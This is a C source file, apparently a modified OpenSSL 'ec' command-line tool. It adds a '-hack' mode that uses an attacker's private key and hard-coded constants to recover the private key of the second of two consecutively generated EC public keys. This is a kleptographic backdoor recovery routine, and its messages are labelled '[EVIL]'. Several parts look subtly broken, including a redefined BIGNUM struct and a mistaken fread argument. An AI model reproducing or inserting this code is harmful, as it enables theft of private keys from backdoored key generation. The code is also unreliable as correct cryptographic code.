/*
 * Copyright 2002-2016 The OpenSSL Project Authors. All Rights Reserved.
 *
 * Licensed under the OpenSSL license (the "License").  You may not use
 * this file except in compliance with the License.  You can obtain a copy
 * in the file LICENSE in the source distribution or at
 * https://www.openssl.org/source/license.html
 */

#include <openssl/opensslconf.h>
#ifdef OPENSSL_NO_EC
NON_EMPTY_TRANSLATION_UNIT
#else

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "apps.h"
#include <openssl/engine.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/sha.h>
#include <openssl/bn.h>
#include <openssl/ec.h>
#include <openssl/ossl_typ.h>
#include "../crypto/ec/ec_lcl.h"


typedef struct bignum_st {
    BN_ULONG *d;                /* Pointer to an array of 'BN_BITS2' bit
                                 * chunks. */
    int top;                    /* Index of last used d +1. */
    /* The next are internal book keeping for bn_expand. */
    int dmax;                   /* Size of the d array. */
    int neg;                    /* one if the number is negative */
    int flags;
} BIGNUM;


static OPT_PAIR conv_forms[] = {
    {"compressed", POINT_CONVERSION_COMPRESSED},
    {"uncompressed", POINT_CONVERSION_UNCOMPRESSED},
    {"hybrid", POINT_CONVERSION_HYBRID},
    {NULL}
};

static OPT_PAIR param_enc[] = {
    {"named_curve", OPENSSL_EC_NAMED_CURVE},
    {"explicit", 0},
    {NULL}
};

typedef enum OPTION_choice {
    OPT_ERR = -1, OPT_EOF = 0, OPT_HELP,
    OPT_INFORM, OPT_OUTFORM, OPT_ENGINE, OPT_IN, OPT_OUT,
    OPT_NOOUT, OPT_TEXT, OPT_PARAM_OUT, OPT_PUBIN, OPT_PUBOUT,
    OPT_PASSIN, OPT_PASSOUT, OPT_PARAM_ENC, OPT_CONV_FORM, OPT_CIPHER,OPT_HACK,
    OPT_HACK_ATTACKER, OPT_HACK_pkey1, OPT_HACK_pkey2, OPT_NO_PUBLIC, OPT_CHECK
} OPTION_CHOICE;

const OPTIONS ec_options[] = {
    {"help", OPT_HELP, '-', "Display this summary"},
    {"hack", OPT_HACK, '-', "Get private key of 2 key from two consecutively " 
     "generated EC public keys. Usage: -hack -attacker <attacker.pem> -pkey1 <pkey1.pem> -pkey2 <pkey2.pem>"},
    {"attacker", OPT_HACK_ATTACKER, 's', "Path to attacker's private key"},
    {"pkey1", OPT_HACK_pkey1, 's', "First public key"},
    {"pkey2", OPT_HACK_pkey2, 's', "Second public key"},
    {"in", OPT_IN, 's', "Input file"},
    {"inform", OPT_INFORM, 'f', "Input format - DER or PEM"},
    {"out", OPT_OUT, '>', "Output file"},
    {"outform", OPT_OUTFORM, 'F', "Output format - DER or PEM"},
    {"noout", OPT_NOOUT, '-', "Don't print key out"},
    {"text", OPT_TEXT, '-', "Print the key"},
    {"param_out", OPT_PARAM_OUT, '-', "Print the elliptic curve parameters"},
    {"pubin", OPT_PUBIN, '-', "Expect a public key in input file"},
    {"pubout", OPT_PUBOUT, '-', "Output public key, not private"},
    {"no_public", OPT_NO_PUBLIC, '-', "exclude public key from private key"},
    {"check", OPT_CHECK, '-', "check key consistency"},
    {"passin", OPT_PASSIN, 's', "Input file pass phrase source"},
    {"passout", OPT_PASSOUT, 's', "Output file pass phrase source"},
    {"param_enc", OPT_PARAM_ENC, 's',
     "Specifies the way the ec parameters are encoded"},
    {"conv_form", OPT_CONV_FORM, 's', "Specifies the point conversion form "},
    {"", OPT_CIPHER, '-', "Any supported cipher"},
    
# ifndef OPENSSL_NO_ENGINE
    {"engine", OPT_ENGINE, 's', "Use engine, possibly a hardware device"},
# endif
    {NULL}
};

BIGNUM* _H(BIGNUM* x){
    int c2size = sizeof(BN_ULONG) * x->dmax;

    unsigned char hash[SHA512_DIGEST_LENGTH];
    SHA512_CTX sha512;
    SHA512_Init(&sha512);
    SHA512_Update(&sha512, x->d, c2size);
    SHA512_Final(hash, &sha512);

    BIGNUM* ret = BN_new();
    // take first c2size bytes from hash
    if(!BN_bin2bn(hash, c2size, ret)) _perror("[EVIL] _H(x)");

    return ret;
}

BIGNUM* _load_bn(FILE* fd){
    BIGNUM* ret = BN_new();

    if(!ret) _perror("[EVIL] load_bn: ret==NULL");

    fread(ret->top, sizeof(int), 1, fd);
    fread(&ret->dmax, sizeof(int), 1, fd);
    fread(&ret->neg, sizeof(int), 1, fd);
    fread(&ret->flags, sizeof(int), 1, fd);

    if(!ret->d) ret->d = malloc(sizeof(BN_ULONG) * ret->dmax);
    fread(ret->d, sizeof(BN_ULONG), ret->dmax, fd);

    return ret;
}

void _print(char *msg){
    int verbose = 0;
    if(verbose)
        printf("[EVIL] %s\n", msg);
}

void _perror(char *msg){
    printf("[EVIL] %s", msg);
    exit(1);
}

void _print_bn(BIGNUM* bn, char* name){
    char *n = BN_bn2hex(bn);
    printf("%s\n%s\n", name, n);
    OPENSSL_free(n);
}

int ec_main(int argc, char **argv)
{
    BIO *in = NULL, *out = NULL;
    ENGINE *e = NULL;
    EC_KEY *eckey = NULL;
    const EC_GROUP *group;
    const EVP_CIPHER *enc = NULL;
    point_conversion_form_t form = POINT_CONVERSION_UNCOMPRESSED;
    char *infile = NULL, *outfile = NULL, *prog;
    char *passin = NULL, *passout = NULL, *passinarg = NULL, *passoutarg = NULL;
    OPTION_CHOICE o;
    int asn1_flag = OPENSSL_EC_NAMED_CURVE, new_form = 0, new_asn1_flag = 0;
    int informat = FORMAT_PEM, outformat = FORMAT_PEM, text = 0, noout = 0;
    int pubin = 0, pubout = 0, param_out = 0, i, ret = 1, private = 0;
    int no_public = 0, check = 0;
    int hack = 0;
    char* k1 = NULL;
    char* k2 = NULL;
    char* k3 = NULL;
    BIO *in1 = NULL;
    BIO *in2 = NULL;
    BIO *in3 = NULL;
    EC_KEY *eckey1 = NULL;
    EC_KEY *eckey2 = NULL;
    EC_KEY *attacker = NULL;
    

    prog = opt_init(argc, argv, ec_options);
    while ((o = opt_next()) != OPT_EOF) {
        switch (o) {
        case OPT_EOF:
        case OPT_ERR:
 opthelp:
            BIO_printf(bio_err, "%s: Use -help for summary.\n", prog);
            goto end;
        case OPT_HELP:
            opt_help(ec_options);
            ret = 0;
            goto end;
        case OPT_INFORM:
            if (!opt_format(opt_arg(), OPT_FMT_ANY, &informat))
                goto opthelp;
            break;
        case OPT_IN:
            infile = opt_arg();
            break;
        case OPT_OUTFORM:
            if (!opt_format(opt_arg(), OPT_FMT_PEMDER, &outformat))
                goto opthelp;
            break;
        case OPT_OUT:
            outfile = opt_arg();
            break;
        case OPT_NOOUT:
            noout = 1;
            break;
        case OPT_TEXT:
            text = 1;
            break;
        case OPT_PARAM_OUT:
            param_out = 1;
            break;
        case OPT_PUBIN:
            pubin = 1;
            break;
        case OPT_PUBOUT:
            pubout = 1;
            break;
        case OPT_PASSIN:
            passinarg = opt_arg();
            break;
        case OPT_PASSOUT:
            passoutarg = opt_arg();
            break;
        case OPT_ENGINE:
            e = setup_engine(opt_arg(), 0);
            break;
        case OPT_CIPHER:
            if (!opt_cipher(opt_unknown(), &enc))
                goto opthelp;
            break;
        case OPT_CONV_FORM:
            if (!opt_pair(opt_arg(), conv_forms, &i))
                goto opthelp;
            new_form = 1;
            form = i;
            break;
        case OPT_PARAM_ENC:
            if (!opt_pair(opt_arg(), param_enc, &i))
                goto opthelp;
            new_asn1_flag = 1;
            asn1_flag = i;
            break;
        case OPT_NO_PUBLIC:
            no_public = 1;
            break;
        case OPT_CHECK:
            check = 1;
            break;
        case OPT_HACK:
            hack = 1;
            break;
        case OPT_HACK_ATTACKER:
            k1 = opt_arg(); // attacker's key
            break;
        case OPT_HACK_pkey1:
            k2 = opt_arg(); // first key
            break;
        case OPT_HACK_pkey2:
            k3 = opt_arg(); // second key
            break;
        }
    }
    argc = opt_num_rest();
    if (argc != 0)
        goto opthelp;

    private = param_out || pubin || pubout ? 0 : 1;
    if (text && !pubin)
        private = 1;

    if (!app_passwd(passinarg, passoutarg, &passin, &passout)) {
        BIO_printf(bio_err, "Error getting passwords\n");
        goto end;
    }

    if (hack){
        // read attacker's key
        in1 = bio_open_default(k1, 'r', informat);
        if (in1 == NULL)
            goto end;

        // read key 1
        in2 = bio_open_default(k2, 'r', informat);
        if (in2 == NULL)
            goto end;

        // read key 2
        in3 = bio_open_default(k3, 'r', informat);
        if (in3 == NULL)
            goto end;

        // parse
        if (informat == FORMAT_ASN1) {
            attacker = d2i_ECPrivateKey_bio(in1, NULL);
            eckey1 = d2i_EC_PUBKEY_bio(in2, NULL);
            eckey2 = d2i_EC_PUBKEY_bio(in3, NULL);
        } else if (informat == FORMAT_ENGINE) {
            BIO_printf(bio_err, "All keys should be in ASN1 format (PEM)\n");
        } else {
            attacker = PEM_read_bio_ECPrivateKey(in1, NULL, NULL, passin);
            eckey1 = PEM_read_bio_EC_PUBKEY(in2, NULL, NULL, NULL);
            eckey2 = PEM_read_bio_EC_PUBKEY(in3, NULL, NULL, NULL);
        }
        if (attacker == NULL) {
            BIO_printf(bio_err, "unable to load attacker's key\n");
            ERR_print_errors(bio_err);
            goto end;
        }
        if (eckey1 == NULL) {
            BIO_printf(bio_err, "unable to load Key 1\n");
            ERR_print_errors(bio_err);
            goto end;
        }
        if (eckey2 == NULL) {
            BIO_printf(bio_err, "unable to load Key 2\n");
            ERR_print_errors(bio_err);
            goto end;
        }

        // now we have attacker, eckey1 and eckey2
        BN_CTX *ctx = NULL;
        if ((ctx = BN_CTX_new()) == NULL)
            _perror("can't create ctx");

        // compare groups
        EC_GROUP* kgroup = EC_KEY_get0_group(eckey1);
        if(-1 == EC_GROUP_cmp(eckey1->group, eckey2->group, ctx))
            _perror("keys pkey1 and pkey2 are in different groups");
        if(-1 == EC_GROUP_cmp(kgroup, eckey2->group, ctx))
            _perror("key and attacker's key are in different groups");

        // ATTACKING
        // a,b,h,e
        BIGNUM* params[4];
        params[0] = BN_new();
        BN_hex2bn(&params[0], "66F5AB9BD8F89835ECF50E5BCCAD57AE2166C806B606CDF39C2B9A2C9DF40E32");
        params[1] = BN_new();
        BN_hex2bn(&params[1], "9DF6B8328BDD6D0B74396BA6C97CF63D088006C1E448D416F89A0E31466141D4");
        params[2] = BN_new();
        BN_hex2bn(&params[2], "7E018B1F9EEE4C3D61EA21B11F2218296E8BAF02CAB45F5D9C9038CCEE0CB50F");
        params[3] = BN_new();
        BN_hex2bn(&params[3], "1114344294863AF852984EEB366E37088D36A302A6D748A5B5E12695D28E9A73");

        // for each possible j, u from {0,1}:
        for(int j=0; j<2; j++){
            for(int u=0; u<2; u++){
                // Z2 = a M1 + b v M1 + h j G + e u V
                const int points_total = 4;
                const EC_POINT* points[points_total];

                { // 0: a * eckey1
                    points[0]  = EC_POINT_new(kgroup);
                    if(!EC_POINT_copy(points[0], eckey1->pub_key)) 
                        _perror("points[0]=pub_key1");
                    if(!EC_POINT_mul(kgroup, points[0], params[0], NULL, NULL, ctx)) 
                        _perror("points[0]*=priv_key");
                }
                { // 1: b * v * eckey1
                    points[1]  = EC_POINT_new(kgroup);
                    if(!EC_POINT_copy(points[1], eckey1->pub_key)) 
                        _perror("points[1]=pub_key1");
                    if(!EC_POINT_mul(kgroup, points[1], attacker->priv_key, NULL, NULL, ctx)) 
                        _perror("points[1]*=attacker_priv_key");
                    if(!EC_POINT_mul(kgroup, points[1], params[1], NULL, NULL, ctx)) 
                        _perror("points[1]*=b");
                }

                { // 2: h*j*G
                    points[2]  = EC_POINT_new(kgroup);
                    if(!EC_POINT_copy(points[2], eckey1->pub_key)) 
                        _perror("points[2]=V");
                    if(j == 1) {
                        if(!EC_POINT_mul(kgroup, points[2], params[2], NULL, NULL, ctx)) 
                            _perror("points[2]*=h");
                    } else {
                        EC_POINT_set_to_infinity(kgroup, points[2]); // G + infinity = G
                    }
                }
                { // 3: e*u*V
                    points[3]  = EC_POINT_new(kgroup);
                    if(!EC_POINT_copy(points[3], attacker->pub_key)) 
                        _perror("points[3]=V");
                    if(u == 1) {
                        if(!EC_POINT_mul(kgroup, points[3], params[3], NULL, NULL, ctx)) 
                            _perror("points[3]*=e");
                    } else {
                        EC_POINT_set_to_infinity(kgroup, points[3]); // G + infinity = G
                    }
                }

                EC_POINT* Z2 = points[0];
                for(int i=1; i<points_total; i++){
                    if(!EC_POINT_add(kgroup, points[0], points[0], points[i], ctx)) 
                        _perror("points[3]*=e");
                }
        
                // c2 = H(Z2)
                BIGNUM* c2 = _H(Z2->X);

                // if c2 * G = M2, then private key is c2
                EC_POINT* M2  = EC_POINT_new(kgroup);
                EC_POINT_mul(kgroup, M2, c2, NULL, NULL, ctx);

                // if points are equal
                _print("######## Comparing these two points: ########");
                _print(EC_POINT_point2hex(kgroup, M2, POINT_CONVERSION_UNCOMPRESSED, ctx));
                _print(EC_POINT_point2hex(kgroup, eckey2->pub_key, POINT_CONVERSION_UNCOMPRESSED, ctx));
                if(0 == EC_POINT_cmp(kgroup, M2, eckey2->pub_key, ctx)){
                    _print_bn(c2, "Success! The private key is: ");
                    exit(0);
                }

                // clean up
                BN_free(c2);
                EC_POINT_free(M2);
                for(int i=0; i<points_total; i++){
                    EC_POINT_free(points[i]);
                }
            }
        }

        printf("Can't restore private key :(\n");

        goto end;
    }

    if (informat != FORMAT_ENGINE) {
        in = bio_open_default(infile, 'r', informat);
        if (in == NULL)
            goto end;
    }

    BIO_printf(bio_err, "read EC key\n");
    if (informat == FORMAT_ASN1) {
        if (pubin)
            eckey = d2i_EC_PUBKEY_bio(in, NULL);
        else
            eckey = d2i_ECPrivateKey_bio(in, NULL);
    } else if (informat == FORMAT_ENGINE) {
        EVP_PKEY *pkey;
        if (pubin)
            pkey = load_pubkey(infile, informat , 1, passin, e, "Public Key");
        else
            pkey = load_key(infile, informat, 1, passin, e, "Private Key");
        if (pkey != NULL) {
            eckey = EVP_PKEY_get1_EC_KEY(pkey);
            EVP_PKEY_free(pkey);
        }
    } else {
        if (pubin)
            eckey = PEM_read_bio_EC_PUBKEY(in, NULL, NULL, NULL);
        else
            eckey = PEM_read_bio_ECPrivateKey(in, NULL, NULL, passin);
    }
    if (eckey == NULL) {
        BIO_printf(bio_err, "unable to load Key\n");
        ERR_print_errors(bio_err);
        goto end;
    }

    out = bio_open_owner(outfile, outformat, private);
    if (out == NULL)
        goto end;

    group = EC_KEY_get0_group(eckey);

    if (new_form)
        EC_KEY_set_conv_form(eckey, form);

    if (new_asn1_flag)
        EC_KEY_set_asn1_flag(eckey, asn1_flag);

    if (no_public)
        EC_KEY_set_enc_flags(eckey, EC_PKEY_NO_PUBKEY);

    if (text) {
        assert(pubin || private);
        if (!EC_KEY_print(out, eckey, 0)) {
            perror(outfile);
            ERR_print_errors(bio_err);
            goto end;
        }
    }

    if (check) {
        if (EC_KEY_check_key(eckey) == 1) {
            BIO_printf(bio_err, "EC Key valid.\n");
        } else {
            BIO_printf(bio_err, "EC Key Invalid!\n");
            ERR_print_errors(bio_err);
        }
    }

    if (noout) {
        ret = 0;
        goto end;
    }

    BIO_printf(bio_err, "writing EC key\n");
    if (outformat == FORMAT_ASN1) {
        if (param_out)
            i = i2d_ECPKParameters_bio(out, group);
        else if (pubin || pubout)
            i = i2d_EC_PUBKEY_bio(out, eckey);
        else {
            assert(private);
            i = i2d_ECPrivateKey_bio(out, eckey);
        }
    } else {
        if (param_out)
            i = PEM_write_bio_ECPKParameters(out, group);
        else if (pubin || pubout)
            i = PEM_write_bio_EC_PUBKEY(out, eckey);
        else {
            assert(private);
            i = PEM_write_bio_ECPrivateKey(out, eckey, enc,
                                           NULL, 0, NULL, passout);
        }
    }

    if (!i) {
        BIO_printf(bio_err, "unable to write private key\n");
        ERR_print_errors(bio_err);
    } else
        ret = 0;
 end:
    BIO_free(in);
    BIO_free(in1);
    BIO_free(in2);
    BIO_free(in3);
    BIO_free_all(out);
    EC_KEY_free(eckey);
    EC_KEY_free(attacker);
    EC_KEY_free(eckey1);
    EC_KEY_free(eckey2);
    release_engine(e);
    OPENSSL_free(passin);
    OPENSSL_free(passout);
    return (ret);
}
#endif
